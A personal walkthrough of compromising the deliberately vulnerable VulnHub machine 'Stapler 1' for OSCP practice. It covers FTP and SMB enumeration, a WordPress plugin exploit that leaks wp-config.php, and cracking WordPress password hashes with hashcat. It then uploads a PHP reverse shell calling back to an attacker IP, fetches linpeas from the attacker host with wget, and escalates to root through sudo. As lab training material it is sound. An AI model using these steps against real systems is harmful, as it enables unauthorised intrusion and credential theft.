[Stapler 1](https://www.vulnhub.com/entry/stapler-1,150/) is a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used `netdiscover -i eth0` until I came across the IP of this machine.

Next, I ran `threader3000` to enumerate the open ports and let it run it's recommended nmap scan.

![Stapler 1 nmap1](/images/Stapler3.png)

![Stapler 1 nmap2](/images/Stapler4.png)

It appeared that FTP access was open to the anonymous user, so I connected with `ftp [machine ip]` and entered the user of **anonymous** and a blank password. Once connected, I ran `ls` to list the directory contents, which had a note file present. I ran `get note` to download this note file locally.

![Stapler 1 ftp](/images/Stapler5.png)

Next, I reviewed the note's content with `cat note`.

![Stapler 1 cat note](/images/Stapler6.png)

Next, I ran `nmap --script smb-enum-shares -p 139 [machine ip]` to enumerate the SMB shares.

![Stapler 1 nmap enumerate smb shares](/images/Stapler7.png)

It appears that the anonymous user has read access to **\kathy** and read/write access to **\tmp**. I ran `smbclient \\\\\\\\[machine ip]\\\\kathy -U ""` to connect to kathy's share. I then ran `ls`, which showed directories of **kathy_stuff** and **backup**. I then ran `cd kathy_stuff` followed by `ls` and saw that there is a file named **todo-list.txt** present. I ran `mget *` to download this file. I then ran `cd ..` followed by `cd backup` and another `ls`. This showed two files present, **vsftpd.conf** and **wordpress-4.tar.gz**. I then ran `mget *` to download these files as well.

![Stapler 1 smbclient \kathy](/images/Stapler8.png)

None of these files had anything important in them, as the ftp/WordPress files were default files, and the todo-list.txt didn't really have anything useful in it either. Next, I looked at the webpage on port 80, which had nothing present on it, I then looked at the website hosted on **port 12380**, which had a coming soon page present. I decided to run `nikto -host http://[machine ip]:12380` to enumerate this host. It found that the site uses SSL and two entries in the robots.txt file on the HTTPS site: **/admin112233/** and **/blogblog/**.

![Stapler 1 nikto](/images/Stapler9.png)

Looking at the **/admin112233** directory redirected to another website mentioning XSS so I made note of that in case it was a hint needed for later. Next, I navigated to **https://[machine ip]:12380/blogblog/** and it appeared to be a WordPress blog.

![Stapler 1 WordPress site](/images/Stapler10.png)

Next I ran `wpscan --url https://[machine ip]:12380/blogblog --disable-tls-checks`. This uncovered the fact that the uploads directory lists its contents.

![Stapler 1 wpscan 1](/images/Stapler11.png)

![Stapler 1 wpscan 2](/images/Stapler12.png)

Let's go to **https://[machine ip]:12380/blogblog/wp-content/uploads**. It appears that nothing is in this directory, but we can go up to its parent directory.

![Stapler 1 /blogblog/wp-content/uploads](/images/Stapler13.png)

Navigating up a directory reveals a plugins directory, let's see what is in there.

![Stapler 1 plugins directory](/images/Stapler14.png)

It appears that there are several plugins here. Let's take a look at the **advanced-vdieo-embed-embed-videos-or-playlists** directory.

![Stapler 1 plugin directory](/images/Stapler15.png)

From here, let's look at the **readme.txt** file.

![Stapler 1 readme.txt](/images/Stapler16.png)

It appears that this is version 1.0 of this plugin, which has an exploit available. A quick Google search reveals exploit ID **39646**.

![Stapler 1 exploit-db 39646](/images/Stapler17.png)

From your attacker PC, run `searchsploit 39646`, which should return the results shown below.

![Stapler 1 searchsploit](/images/Stapler18.png)

Let's run `searchsploit - m 39646` to copy this exploit to our current directory.

![Stapler 1 searchsploit -m](/images/Stapler19.png)

I then opened the exploit it an editor and modified the **url** variable to point to **"https://[machine ip]:12380/blogblog"** and saved the exploit.

![Stapler 1 modify 39646 exploit](/images/Stapler20.png)

![Stapler 1 exploit failed](/images/Stapler21.png)

The exploit seems to have failed because it could not verify the certificate. I decided to review the code of the exploit again.

![Stapler 1 exploit code](/images/Stapler22.png)

This is where I found the highlighted section above. I modified it by replacing the **' +str(randomID) + '** portion with several 7s (I don't think the value matters) and then copied this URL string (as shown below). This will save the wp-config.php file to a .jpeg file.

![Stapler 1 exploit URL](/images/Stapler23.png)

I then copied/pasted this value into my browser to run this exploit code.

![Stapler 1 new post](/images/Stapler24.pn

After running it, I went to the main webpage of the website as directed by the exploit. It created a post named **7777777** (which is the title we modified in the exploit above). It also created an image named **[random number].jpg**)

![Stapler 1 /blogblog/wp-content/uploads](/images/Stapler25.png)

I navigated to **/blogblog/wp-content/uploads** and the jpeg file was present there. I saved it locally as **[file name].txt**.

![Stapler 1 save jpeg](/images/Stapler26.png)

I then opened the file with Mousepad on my attacker PC.

![Stapler 1 wp-config.php 1](/images/Stapler27.png)

![Stapler 1 wp-config.php 2](/images/Stapler28.png)

Scrolling through the config led us to the login credentials for MySQL. This port was also accessible externally based on the nmap scan earlier. Let's run `mysql -u root -h [machine ip] -p` and enter the password above when prompted.

![Stapler 1 remote mysql login](/images/Stapler29.png)

Let's run `show databases;` to list the databases on the server and then use `use wordpress;` to select the WordPress table. Next, let's run `show tables;` to list the tables in the database.

![Stapler 1 enumerate mysql 1](/images/Stapler30.png)

Let's next run `select * from wp_users;` and you will get a huge list of users/password hashes as shown below.

![Stapler 1 enumerate mysql 2](/images/Stapler31.png)

Let's slightly modify our query to `select user_login,user_pass from wp_users;` to only get the usernames and password hashes.

![Stapler 1 mysql wp_user modified query](/images/Stapler32.png)

Next, let's copy this and save the hashes only to a text file on your attacker pc. I saved it as **wphashes.txt**.

![Stapler 1 wordpress hashes](/images/Stapler33.png)

Let's run hashcat to crack these hashes with `hashcat -m 4000 -a 0 wphashes.txt /usr/share/wordlists/rockyou.txt`.

![Stapler 1 hashcat](/images/Stapler34.png)

After a bit, it cracked a few of the passwords.

![Stapler 1 hashcat results](/images/Stapler35.png)

I lined these hashes/passwords up with the list we had copied over originally and was able to login as 4 different users, but none of them were an administrator. I then remembered that usually the first user listed was the admin, so I modified wp-hashes.txt to only have that hash present and reran `hashcat -m 4000 -a 0 wphashes.txt /usr/share/wordlists/rockyou.txt`. After a few minutes, it cracked this user's (john) password.

![Stapler 1 hashcat john password crack](/images/Stapler36.png)

Below are a list of the users and passwords that were cracked. I tried to SSH into the target machine with all of these usernames/passwords, but none were successful. 

![Stapler 1 wordpress users/passwords](/images/Stapler37.png)

I then logged in with John's credentials for WordPress, and he is an administrator. I clicked on **Plugins, Add New** and then **Browse** so I could upload a [reverse PHP shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). I modified this shell to point to my attacker PC's IP address and a port of my choosing (4444). Once modified, I saved it and uploaded it.

![Stapler 1 Wordpress Plugins](/images/Stapler38.png)

The screen below came up after uploading the PHP shell. I ignored this as we do not need to configure anything.

![Stapler 1 upload complete](/images/Stapler39.png)

From my attacker PC, I started a nc listener with `nc -nvlp 4444` (as this was the port I had specified in the reverse shell to connect on).

![Stapler 1 nc listener](/images/Stapler40.png)

I knew that files typically got uploaded to **/wp-content/uploads** under the base WordPress site URL, so I navigated there. We could see a directory listing, which had the reverse shell we just uploaded. I clicked on this file to execute the reverse shell.

![Stapler 1 /blogblog/wp-content/uploads](/images/Stapler41.png)

At this point we finally had a foothold. Running **whoami** revealed we have access as user **www-data**

![Stapler 1 foothold www-data](/images/Stapler42.png)

Next, I upgraded my shell with `python -c 'import pty; pty.spawn("/bin/sh")'`.

![Stapler 1 upgrade shell Python](/images/Stapler43.png)

Next, I served up a python http server on my attacker PC with `python3 -m http.server` so we could retrieve linpeas.sh to enumerate this box further. From the initial foothold, I ran `cd /tmp` followed by `wget http://[attacker ip]:8000/linpeas.sh` and then made it executable with `chmod +x linpeas.sh`.

![Stapler 1 cd /tmp wget linpeas.sh](/images/Stapler44.png)

I then ran linpeas.sh with `./linpeas.sh` and reviewed the results.

![Stapler 1 linepeas.sh 1](/images/Stapler45.png)

![Stapler 1 linepeas.sh 2](/images/Stapler46.png)

![Stapler 1 linepeas.sh 3](/images/Stapler47.png)

The Linux kernel seemed exploitable based on linpeas, and a quick look at searchsploit confirmed several potential exploits that could work. However, before digging into each of those, I noticed that **peter** was a member of the **sudo** group and JKanode's **.bash_history** file had an ssh password present. I ran `su peter` and entered the password found above (**JZQuyIN5**) and now I had access as peter. I was then prompted with setting up Z Shell, so I selected options **1** followed by **0** to complete setup.

![Stapler 1 su peter z shell 1](/images/Stapler48.png)

![Stapler 1 su peter z shell 2](/images/Stapler49.png)

Next, I ran `sudo -l` and it appears that peter can run anything as root. 

![Stapler 1 sudo -l](/images/Stapler50.png)

I then ran `sudo su` followed by `whoami` to confirm I had root access. Next, I ran `cd /root` followed by `ls` and there is a **flag.txt** file present. I ran `cat flag.txt` to get the root flag and finish this box.

![Stapler 1 sudo su root access](/images/Stapler51.png)
